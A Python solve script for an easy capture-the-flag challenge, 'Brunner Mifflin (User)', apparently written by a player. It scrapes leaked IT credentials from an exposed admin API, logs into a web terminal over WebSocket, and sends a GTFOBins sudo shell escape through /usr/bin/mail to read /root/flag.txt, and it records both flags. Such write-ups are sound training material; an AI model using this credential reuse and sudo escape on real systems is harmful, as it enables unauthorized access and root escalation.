import requests, websockets, urllib.parse, asyncio


# Brunner Mifflin (User)
# Difficulty: Easy

# You have found the Brunner Mifflin HR system, and your curious nature
# makes you wonder if you can view all the monsters?

comments = '''
  Connects to the IT web terminal via WebSocket using extracted credentials,
  leverages sudo privileges on /usr/bin/mail with shell escapes, and retrieves the flag
'''

tags = '''
  #websocket #sudo #gtfobins #mail #ctf #python #privesc
'''

class Py_testing:
  def main():
    URL = 'https://brunner-mifflin-user-6e005d4ec66b6e35-global.challs.brunnerne.xyz'
    WS_URL = "wss://brunner-mifflin-user-6e005d4ec66b6e35-global.challs.brunnerne.xyz"

    response = requests.get(f'{URL}/api/User/Admin/itguy')

    # To setup e-mail survailance I connect through the IT web terminal at /terminal with my username: itguy and my password: itguy321 <br /> brunner{1tGuyW111F1x}
    username = [x for x in response.text.split(' ') if x.startswith('itguy')][0]
    password = [x for x in response.text.split(' ') if x.startswith('itguy')][1]

    login_data = { "username": username, "password": password }

    response = requests.post(f'{URL}/api/Terminal/Login', json=login_data).json()

    token = response['token']
    # URL-encode the token so special characters don't break the WebSocket connection URL
    encoded_token = urllib.parse.quote(token)

    async def run_terminal():
      # Establish the asynchronous WebSocket connection
      async with websockets.connect(f'{WS_URL}/api/Terminal/Session?token={encoded_token}') as ws:
        async def receive_messages():
          try:
            async for message in ws:
              # Decode incoming raw byte streams into human-readable text
              if isinstance(message, bytes): message = message.decode('utf-8', errors='ignore')
              print(message, end='', flush=True)
          except asyncio.CancelledError: pass

        # Launch the background receiver task in the asyncio event loop
        recv_task = asyncio.create_task(receive_messages())
        await asyncio.sleep(2)

        # Send the GTFOBins exploitation command using sudo on mail with a shell escape sequence (!cmd) to read root files
        await ws.send("sudo /usr/bin/mail --exec='!cat /root/flag.txt'\n")
        await asyncio.sleep(3)

        recv_task.cancel()

    asyncio.run(run_terminal())

  # flag => brunner{1tguy_t4k35_m41l_s3cur1ty_v3ry_53r10u5}

if __name__ == '__main__':
  Py_testing.main()
